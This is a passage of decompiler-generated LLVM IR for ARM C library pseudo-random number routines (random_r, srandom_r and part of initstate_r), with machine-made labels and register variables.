  %v2_2a1dc = load i32, i32* %r4.global-to-local, align 4
  %v3_2a1dc = add i32 %v2_2a1dc, 12
  %v4_2a1dc = inttoptr i32 %v3_2a1dc to i8*
  store i8 %v1_2a1dc, i8* %v4_2a1dc, align 1
  %v0_2a1e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2a1e0, label %dec_label_pc_2a20c, label %dec_label_pc_2a1e4

dec_label_pc_2a1e4:                               ; preds = %dec_label_pc_2a1bc
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_2a1e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_2a1e8 = add i32 %v0_2a1e8, -4
  %v2_2a1e8 = inttoptr i32 %v1_2a1e8 to i32*
  %v3_2a1e8 = load i32, i32* %v2_2a1e8, align 4
  %v2_2a1ec = sdiv i32 %v3_2a1e8, 5
  store i32 %v2_2a1ec, i32* %r0.global-to-local, align 4
  %v4_2a1f0 = mul i32 %v2_2a1ec, 4
  %v5_2a1f0 = add i32 %v4_2a1f0, %v0_2a1e8
  %v1_2a1f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a1f4 = add i32 %v1_2a1f4, 4
  %v3_2a1f4 = inttoptr i32 %v2_2a1f4 to i32*
  store i32 %v5_2a1f0, i32* %v3_2a1f4, align 4
  %v0_2a1f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2a1f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_2a1f8 = add i32 %v1_2a1f8, %v0_2a1f8
  %v0_2a1fc = load i32, i32* %r5.global-to-local, align 4
  %v2_2a200 = udiv i32 %v2_2a1f8, %v0_2a1fc
  %v3_2a200 = urem i32 %v2_2a1f8, %v0_2a1fc
  store i32 %v2_2a200, i32* %r0.global-to-local, align 4
  %v0_2a204 = load i32, i32* %r6.global-to-local, align 4
  %v4_2a204 = mul i32 %v3_2a200, 4
  %v5_2a204 = add i32 %v0_2a204, %v4_2a204
  store i32 %v5_2a204, i32* %r1.global-to-local, align 4
  %v1_2a208 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a208 = inttoptr i32 %v1_2a208 to i32*
  store i32 %v5_2a204, i32* %v2_2a208, align 4
  br label %dec_label_pc_2a20c

dec_label_pc_2a20c:                               ; preds = %dec_label_pc_2a1bc, %dec_label_pc_2a1e4
  %v0_2a20c = load i32, i32* %r6.global-to-local, align 4
  %v1_2a20c = load i32, i32* %r5.global-to-local, align 4
  %v4_2a20c = mul i32 %v1_2a20c, 4
  %v5_2a20c = add i32 %v4_2a20c, %v0_2a20c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_2a214 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a214 = add i32 %v1_2a214, 16
  %v3_2a214 = inttoptr i32 %v2_2a214 to i32*
  store i32 %v5_2a20c, i32* %v3_2a214, align 4
  %v0_2a218 = load i32, i32* %r6.global-to-local, align 4
  %v1_2a218 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a218 = add i32 %v1_2a218, 8
  %v3_2a218 = inttoptr i32 %v2_2a218 to i32*
  store i32 %v0_2a218, i32* %v3_2a218, align 4
  %v1_2a238.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a230

dec_label_pc_2a220:                               ; preds = %bb
  %v0_2a220 = call i32 @__GI___errno_location()
  %v2_2a228 = inttoptr i32 %v0_2a220 to i32*
  store i32 22, i32* %v2_2a228, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a230

dec_label_pc_2a230:                               ; preds = %dec_label_pc_2a20c, %dec_label_pc_2a220
  %v1_2a238 = phi i32 [ %v1_2a238.pre, %dec_label_pc_2a20c ], [ -1, %dec_label_pc_2a220 ]
  %v2_2a234 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2a234, i32* @r4, align 4
  ret i32 %v1_2a238

; uselistorder directives
  uselistorder i32 %v0_2a1fc, { 1, 0 }
  uselistorder i32 %v2_2a1f8, { 1, 0 }
  uselistorder i32 %v3_2a1a0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2a230, { 1, 0 }
  uselistorder label %dec_label_pc_2a20c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2a244 = load i32, i32* @r4, align 4
  store i32 %v3_2a244, i32* %stack_var_-8, align 4
  %v1_2a248 = add i32 %tmp, 12
  %v2_2a248 = inttoptr i32 %v1_2a248 to i8*
  %v3_2a248 = load i8, i8* %v2_2a248, align 1
  %v4_2a248 = sext i8 %v3_2a248 to i32
  store i32 %v4_2a248, i32* %r3.global-to-local, align 4
  %v2_2a24c = icmp eq i8 %v3_2a248, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_2a258 = add i32 %tmp, 8
  %v2_2a258 = inttoptr i32 %v1_2a258 to i32*
  %v3_2a258 = load i32, i32* %v2_2a258, align 4
  store i32 %v3_2a258, i32* %lr.global-to-local, align 4
  br i1 %v2_2a24c, label %dec_label_pc_2a260, label %dec_label_pc_2a284

dec_label_pc_2a260:                               ; preds = %entry
  %v1_2a260 = inttoptr i32 %v3_2a258 to i32*
  %v2_2a260 = load i32, i32* %v1_2a260, align 4
  store i32 %v2_2a260, i32* %r2.global-to-local, align 4
  %v2_2a268 = mul i32 %v2_2a260, 1103515245
  %v1_2a270 = add i32 %v2_2a268, 12345
  %tmp6 = bitcast i32 %v1_2a270 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_2a274 = bitcast float %tmp7 to i32
  store i32 %v1_2a274, i32* %r3.global-to-local, align 4
  store i32 %v1_2a274, i32* %v1_2a260, align 4
  %v0_2a27c = load i32, i32* %r3.global-to-local, align 4
  %v2_2a27c = inttoptr i32 %arg2 to i32*
  store i32 %v0_2a27c, i32* %v2_2a27c, align 4
  br label %dec_label_pc_2a2c4

dec_label_pc_2a284:                               ; preds = %entry
  %v2_2a284 = load i32, i32* %arg1, align 4
  store i32 %v2_2a284, i32* %r2.global-to-local, align 4
  %v1_2a288 = add i32 %tmp, 4
  %v2_2a288 = inttoptr i32 %v1_2a288 to i32*
  %v3_2a288 = load i32, i32* %v2_2a288, align 4
  store i32 %v3_2a288, i32* %r0.global-to-local, align 4
  %v1_2a28c = inttoptr i32 %v2_2a284 to i32*
  %v2_2a28c = load i32, i32* %v1_2a28c, align 4
  store i32 %v2_2a28c, i32* %r1.global-to-local, align 4
  %v1_2a290 = inttoptr i32 %v3_2a288 to i32*
  %v2_2a290 = load i32, i32* %v1_2a290, align 4
  %v4_2a290 = add i32 %v3_2a288, 4
  store i32 %v4_2a290, i32* %r0.global-to-local, align 4
  %v2_2a294 = add i32 %v2_2a290, %v2_2a28c
  store i32 %v2_2a294, i32* %r3.global-to-local, align 4
  store i32 %v2_2a294, i32* %v1_2a28c, align 4
  %v3_2a298 = load i32, i32* %r2.global-to-local, align 4
  %v4_2a298 = add i32 %v3_2a298, 4
  store i32 %v4_2a298, i32* %r2.global-to-local, align 4
  %v0_2a29c = load i32, i32* %ip.global-to-local, align 4
  %v1_2a29c = add i32 %v0_2a29c, 16
  %v2_2a29c = inttoptr i32 %v1_2a29c to i32*
  %v3_2a29c = load i32, i32* %v2_2a29c, align 4
  store i32 %v3_2a29c, i32* %r1.global-to-local, align 4
  %v0_2a2a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_2a2a0 = udiv i32 %v0_2a2a0, 2
  store i32 %v3_2a2a0, i32* %r3.global-to-local, align 4
  %v3_2a2a4 = icmp ult i32 %v4_2a298, %v3_2a29c
  %v1_2a2a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a2a8 = inttoptr i32 %v1_2a2a8 to i32*
  store i32 %v3_2a2a0, i32* %v2_2a2a8, align 4
  br i1 %v3_2a2a4, label %dec_label_pc_2a2b4, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_2a284
  %v1_2a2ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_2a2ac, i32* %r2.global-to-local, align 4
  %v0_2a2bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_2a2b4:                               ; preds = %dec_label_pc_2a284
  %v0_2a2b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_2a2b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_2a2b4 = icmp ult i32 %v0_2a2b4, %v1_2a2b4
  br i1 %v3_2a2b4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_2a2b4
  %v1_2a2b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_2a2b8, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_2a2b4, %._crit_edge, %bb
  %v0_2a2bc = phi i32 [ %v0_2a2bc.pre, %._crit_edge ], [ %v0_2a2b4, %dec_label_pc_2a2b4 ], [ %v1_2a2b8, %bb ]
  %v1_2a2bc = load i32, i32* %ip.global-to-local, align 4
  %v2_2a2bc = add i32 %v1_2a2bc, 4
  %v3_2a2bc = inttoptr i32 %v2_2a2bc to i32*
  store i32 %v0_2a2bc, i32* %v3_2a2bc, align 4
  %v0_2a2c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_2a2c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_2a2c0 = inttoptr i32 %v1_2a2c0 to i32*
  store i32 %v0_2a2c0, i32* %v2_2a2c0, align 4
  br label %dec_label_pc_2a2c4

dec_label_pc_2a2c4:                               ; preds = %dec_label_pc_2a260, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_2a2c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2a2c8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_2a2a0, { 1, 0 }
  uselistorder i32 %v1_2a274, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_2a2c4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2a2d4 = load i32, i32* @r4, align 4
  store i32 %v3_2a2d4, i32* %stack_var_-36, align 4
  %v1_2a2d8 = add i32 %tmp, 12
  %v2_2a2d8 = inttoptr i32 %v1_2a2d8 to i8*
  %v3_2a2d8 = load i8, i8* %v2_2a2d8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_2a2e8 = load i8, i8* %v2_2a2d8, align 1
  %tmp33 = icmp ugt i8 %v3_2a2d8, 4
  br i1 %tmp33, label %.dec_label_pc_2a394_crit_edge, label %dec_label_pc_2a2f4

.dec_label_pc_2a394_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_2a394

dec_label_pc_2a2f4:                               ; preds = %entry
  %v0_2a2f4 = load i32, i32* @r0, align 4
  %v2_2a2f4 = icmp eq i32 %v0_2a2f4, 0
  %v1_2a2f8 = add i32 %tmp, 8
  %v2_2a2f8 = inttoptr i32 %v1_2a2f8 to i32*
  %v3_2a2f8 = load i32, i32* %v2_2a2f8, align 4
  store i32 %v3_2a2f8, i32* %r6.global-to-local, align 4
  br i1 %v2_2a2f4, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_2a2f4
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_2a2f4, %bb
  %v0_2a304 = phi i32 [ %v0_2a2f4, %dec_label_pc_2a2f4 ], [ 1, %bb ]
  %v2_2a300 = icmp eq i8 %v3_2a2e8, 0
  %v2_2a304 = inttoptr i32 %v3_2a2f8 to i32*
  store i32 %v0_2a304, i32* %v2_2a304, align 4
  br i1 %v2_2a300, label %dec_label_pc_2a390, label %dec_label_pc_2a30c

dec_label_pc_2a30c:                               ; preds = %bb23
  %v1_2a30c = add i32 %tmp, 13
  %v2_2a30c = inttoptr i32 %v1_2a30c to i8*
  %v3_2a30c = load i8, i8* %v2_2a30c, align 1
  %v4_2a30c = sext i8 %v3_2a30c to i32
  store i32 %v4_2a30c, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_2a318 = load i32, i32* @r0, align 4
  store i32 %v0_2a318, i32* %r4.global-to-local, align 4
  %v0_2a31c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2a31c, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_2a35c25 = icmp sgt i8 %v3_2a30c, 1
  br i1 %v5_2a35c25, label %dec_label_pc_2a328, label %dec_label_pc_2a360

dec_label_pc_2a328:                               ; preds = %dec_label_pc_2a30c, %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge
  %v1_2a33c = phi i32 [ %v1_2a33c.pre, %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge ], [ 2836, %dec_label_pc_2a30c ]
  %v1_2a330 = phi i32 [ %v1_2a330.pre, %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge ], [ 16807, %dec_label_pc_2a30c ]
  %v0_2a32c27 = phi i32 [ %v0_2a350.pre, %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge ], [ %v0_2a318, %dec_label_pc_2a30c ]
  %v1_2a34826 = phi i32 [ %v5_2a348, %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge ], [ %v0_2a31c, %dec_label_pc_2a30c ]
  %v3_2a328 = urem i32 %v0_2a32c27, 127773
  %v2_2a330 = mul i32 %v1_2a330, %v3_2a328
  %v2_2a338 = sdiv i32 %v0_2a32c27, 127773
  %v2_2a33c = mul i32 %v1_2a33c, %v2_2a338
  %v2_2a340 = sub i32 %v2_2a330, %v2_2a33c
  %v8_2a340 = icmp slt i32 %v2_2a340, 0
  %v2_2a344 = add i32 %v2_2a340, 2147483647
  %v2_2a344.v2_2a340 = select i1 %v8_2a340, i32 %v2_2a344, i32 %v2_2a340
  store i32 %v2_2a344.v2_2a340, i32* %r4.global-to-local, align 4
  %v2_2a348 = add i32 %v1_2a34826, 4
  %v3_2a348 = inttoptr i32 %v2_2a348 to i32*
  store i32 %v2_2a344.v2_2a340, i32* %v3_2a348, align 4
  %v4_2a348 = load i32, i32* %r8.global-to-local, align 4
  %v5_2a348 = add i32 %v4_2a348, 4
  store i32 %v5_2a348, i32* %r8.global-to-local, align 4
  %v0_2a34c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_2a34c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_2a350.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2a358 = add i32 %v0_2a34c.pre, 1
  store i32 %v1_2a358, i32* %r7.global-to-local, align 4
  %v5_2a35c = icmp slt i32 %v0_2a34c.pre, %v1_2a34c.pre
  br i1 %v5_2a35c, label %dec_label_pc_2a328.dec_label_pc_2a328_crit_edge, label %dec_label_pc_2a34c.dec_label_pc_2a360_crit_edge

dec_label_pc_2a328.dec_label_pc_2a328_crit_edge:  ; preds = %dec_label_pc_2a328
  %v1_2a330.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_2a33c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2a328

dec_label_pc_2a34c.dec_label_pc_2a360_crit_edge:  ; preds = %dec_label_pc_2a328
  %v0_2a370.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2a360

dec_label_pc_2a360:                               ; preds = %dec_label_pc_2a34c.dec_label_pc_2a360_crit_edge, %dec_label_pc_2a30c
  %v0_2a370 = phi i32 [ %v0_2a370.pre, %dec_label_pc_2a34c.dec_label_pc_2a360_crit_edge ], [ %v0_2a31c, %dec_label_pc_2a30c ]
  %v0_2a364.lcssa = phi i32 [ %v1_2a34c.pre, %dec_label_pc_2a34c.dec_label_pc_2a360_crit_edge ], [ %v4_2a30c, %dec_label_pc_2a30c ]
  %v2_2a364 = mul i32 %v0_2a364.lcssa, 10
  store i32 %v2_2a364, i32* @r4, align 4
  %v0_2a368 = load i32, i32* %r5.global-to-local, align 4
  %v1_2a368 = add i32 %v0_2a368, 14
  %v2_2a368 = inttoptr i32 %v1_2a368 to i8*
  %v3_2a368 = load i8, i8* %v2_2a368, align 1
  %v4_2a368 = sext i8 %v3_2a368 to i32
  %v2_2a36c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_2a36c, i32* %r7.global-to-local, align 4
  %v4_2a370 = mul nsw i32 %v4_2a368, 4
  %v5_2a370 = add i32 %v0_2a370, %v4_2a370
  %v1_2a374 = inttoptr i32 %v0_2a368 to i32*
  store i32 %v5_2a370, i32* %v1_2a374, align 4
  %v3_2a374 = add i32 %v0_2a368, 4
  %v4_2a374 = inttoptr i32 %v3_2a374 to i32*
  %v5_2a374 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_2a374, i32* %v4_2a374, align 4
  br label %dec_label_pc_2a380

dec_label_pc_2a37c:                               ; preds = %dec_label_pc_2a380
  %v0_2a384 = load i32, i32* %r5.global-to-local, align 4
  %v2_2a37c = inttoptr i32 %v0_2a384 to i32*
  %v3_2a37c = call i32 @__GI_random_r(i32* %v2_2a37c, i32 %v2_2a36c)
  br label %dec_label_pc_2a380

dec_label_pc_2a380:                               ; preds = %dec_label_pc_2a360, %dec_label_pc_2a37c
  %v0_2a380 = load i32, i32* @r4, align 4
  %v1_2a380 = add i32 %v0_2a380, -1
  store i32 %v1_2a380, i32* @r4, align 4
  %v6_2a380 = icmp slt i32 %v1_2a380, 0
  br i1 %v6_2a380, label %dec_label_pc_2a390, label %dec_label_pc_2a37c

dec_label_pc_2a390:                               ; preds = %dec_label_pc_2a380, %bb23
  %v2_2a398.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_2a394

dec_label_pc_2a394:                               ; preds = %.dec_label_pc_2a394_crit_edge, %dec_label_pc_2a390
  %v2_2a398 = phi i32 [ %v3_2a2d4, %.dec_label_pc_2a394_crit_edge ], [ %v2_2a398.pre, %dec_label_pc_2a390 ]
  %v1_2a39c = phi i32 [ -1, %.dec_label_pc_2a394_crit_edge ], [ 0, %dec_label_pc_2a390 ]
  store i32 %v2_2a398, i32* @r4, align 4
  ret i32 %v1_2a39c

; uselistorder directives
  uselistorder i32 %v1_2a380, { 1, 0 }
  uselistorder i32 %v0_2a368, { 1, 0, 2 }
  uselistorder i32 %v0_2a34c.pre, { 1, 0 }
  uselistorder i32 %v5_2a348, { 1, 0 }
  uselistorder i32 %v0_2a32c27, { 1, 0 }
  uselistorder i32 %v0_2a31c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_2a394, { 1, 0 }
  uselistorder label %dec_label_pc_2a380, { 1, 0 }
  uselistorder label %dec_label_pc_2a328, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.14"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_2a3a0:
  %v0_2a3a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a3a0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_2a3a0
  %v2_2a3a0 = load i32, i32* @r7, align 4
  %v5_2a3a0 = udiv i32 %v2_2a3a0, 8
  %v6_2a3a0 = and i32 %v5_2a3a0, %arg1
  %v3_2a3a4 = load i32, i32* @fp, align 4
  %v8_2a3a4 = shl i32 %v6_2a3a0, %v3_2a3a4
  %v9_2a3a4 = and i32 %v8_2a3a4, %arg1
  %v2_2a3a8 = load i32, i32* @sp, align 4
  %v8_2a3a8 = shl i32 %v2_2a3a8, %arg3
  %v9_2a3a8 = and i32 %v8_2a3a8, %arg2
  call void @__pseudo_branch(i32 %v9_2a3a8)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2a3a0, %bb
  %v10_2a3a8 = phi i32 [ %arg1, %dec_label_pc_2a3a0 ], [ %v9_2a3a4, %bb ]
  ret i32 %v10_2a3a8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_2a3ac = load i32, i32* @r4, align 4
  %v6_2a3ac = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_2a3dc, label %dec_label_pc_2a3cc

dec_label_pc_2a3cc:                               ; preds = %entry
  %v2_2a3cc = icmp ugt i32 %arg2, 254
  %v7_2a3cc = icmp eq i32 %arg2, 255
  %v2_2a3d0 = xor i1 %v7_2a3cc, true
  %v3_2a3d0 = and i1 %v2_2a3cc, %v2_2a3d0
  br i1 %v3_2a3d0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_2a3cc
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_2a3cc, %bb
  %v1_2a4087 = phi i32 [ %v3_2a3ac, %dec_label_pc_2a3cc ], [ 4, %bb ]
  %v2_2a3d4 = xor i1 %v2_2a3cc, true
  %v3_2a3d4 = or i1 %v7_2a3cc, %v2_2a3d4
  br i1 %v3_2a3d4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_2a3dc:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_2a3f4, label %dec_label_pc_2a3e4

dec_label_pc_2a3e4:                               ; preds = %dec_label_pc_2a3dc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_2a464

.thread10:                                        ; preds = %dec_label_pc_2a3e4
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_2a3f4:                               ; preds = %dec_label_pc_2a3dc
  %v2_2a3f4 = icmp ugt i32 %arg2, 62
  %v7_2a3f4 = icmp eq i32 %arg2, 63
  %v2_2a3f8 = xor i1 %v7_2a3f4, true
  %v3_2a3f8 = and i1 %v2_2a3f4, %v2_2a3f8
  br i1 %v3_2a3f8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_2a3f4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_2a3f4, %bb23
  %v1_2a4086 = phi i32 [ %v3_2a3ac, %dec_label_pc_2a3f4 ], [ 2, %bb23 ]
  %v2_2a3fc = xor i1 %v2_2a3f4, true
  %v3_2a3fc = or i1 %v7_2a3f4, %v2_2a3fc
  br i1 %v3_2a3fc, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_2a414 = phi i32 [ 3, %bb22 ], [ %v1_2a4087, %bb21 ], [ %v1_2a4086, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36228), i32* %r3.global-to-local, align 4
  %v4_2a408 = mul i32 %v1_2a414, 4
  %v5_2a408 = add i32 %v4_2a408, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36228)
  store i32 %v5_2a408, i32* %r2.global-to-local, align 4
  %v1_2a40c = add i32 %v4_2a408, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36208)
  %v2_2a40c = inttoptr i32 %v1_2a40c to i32*
  %v3_2a40c = load i32, i32* %v2_2a40c, align 4
  store i32 %v3_2a40c, i32* %r1.global-to-local, align 4
  %v1_2a410 = add i32 %tmp, 4
  store i32 %v1_2a410, i32* @r6, align 4
  %v6_2a414 = inttoptr i32 %v5_2a408 to i32*
  %v7_2a414 = load i32, i32* %v6_2a414, align 4
  store i32 %v7_2a414, i32* %r2.global-to-local, align 4
  %v4_2a418 = mul i32 %v3_2a40c, 4
  %v5_2a418 = add i32 %v4_2a418, %v1_2a410
  store i32 %v5_2a418, i32* %r3.global-to-local, align 4
  %v2_2a41c = add i32 %arg3, 16
  %v3_2a41c = inttoptr i32 %v2_2a41c to i32*
  store i32 %v5_2a418, i32* %v3_2a41c, align 4
  %v0_2a420 = load i32, i32* %r2.global-to-local, align 4
  %v1_2a420 = trunc i32 %v0_2a420 to i8
  %v2_2a420 = load i32, i32* @r5, align 4
  %v3_2a420 = add i32 %v2_2a420, 14
  %v4_2a420 = inttoptr i32 %v3_2a420 to i8*
  store i8 %v1_2a420, i8* %v4_2a420, align 1
  %v0_2a424 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a424 = trunc i32 %v0_2a424 to i8
  %v2_2a424 = load i32, i32* @r5, align 4
  %v3_2a424 = add i32 %v2_2a424, 13
  %v4_2a424 = inttoptr i32 %v3_2a424 to i8*
  store i8 %v1_2a424, i8* %v4_2a424, align 1
  %v0_2a428 = load i32, i32* @r4, align 4
  %v1_2a428 = trunc i32 %v0_2a428 to i8
  %v2_2a428 = load i32, i32* @r5, align 4
  %v3_2a428 = add i32 %v2_2a428, 12
  %v4_2a428 = inttoptr i32 %v3_2a428 to i8*
  store i8 %v1_2a428, i8* %v4_2a428, align 1
  %v0_2a42c = load i32, i32* @r6, align 4
  %v1_2a42c = load i32, i32* @r5, align 4
  %v2_2a42c = add i32 %v1_2a42c, 8
  %v3_2a42c = inttoptr i32 %v2_2a42c to i32*
  store i32 %v0_2a42c, i32* %v3_2a42c, align 4
  %v0_2a430 = load i32, i32* @r5, align 4
  store i32 %v0_2a430, i32* %r1.global-to-local, align 4
  %v0_2a434 = load i32, i32* @r0, align 4
  %v2_2a434 = inttoptr i32 %v0_2a434 to i32*
  %v3_2a434 = call i32 @srandom_r(i32* %v2_2a434, i32 %v0_2a430)
  store i32 %v3_2a434, i32* %r0.global-to-local, align 4
  %v0_2a438 = load i32, i32* @r4, align 4
  %v2_2a438 = icmp eq i32 %v0_2a438, 0
  br i1 %v2_2a438, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_2a45412 = load i32, i32* @r7, align 4
  %v2_2a45413 = inttoptr i32 %v1_2a45412 to i32*
  store i32 0, i32* %v2_2a45413, align 4
  %v1_2a458 = load i32, i32* @r4, align 4
  store i32 %v1_2a458, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a47c

.thread4:                                         ; preds = %bb26
  %v1_2a43c = load i32, i32* @r5, align 4
  %v2_2a43c = add i32 %v1_2a43c, 4
  %v3_2a43c = inttoptr i32 %v2_2a43c to i32*
  %v4_2a43c = load i32, i32* %v3_2a43c, align 4
  %v1_2a440 = load i32, i32* @r6, align 4
  %v3_2a440 = sub i32 %v4_2a43c, %v1_2a440
  %v4_2a444 = sdiv i32 %v3_2a440, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_2a44c = mul i32 %v4_2a444, 5
  %v5_2a44c = add i32 %v4_2a44c, %v0_2a438
  store i32 %v5_2a44c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_2a454 = load i32, i32* @r7, align 4
  %v2_2a454 = inttoptr i32 %v1_2a454 to i32*
  store i32 0, i32* %v2_2a454, align 4
  %v1_2a45c = load i32, i32* %r3.global-to-local, align 4
  %v2_2a45c = load i32, i32* @r7, align 4
  %v3_2a45c = inttoptr i32 %v2_2a45c to i32*
  store i32 %v1_2a45c, i32* %v3_2a45c, align 4
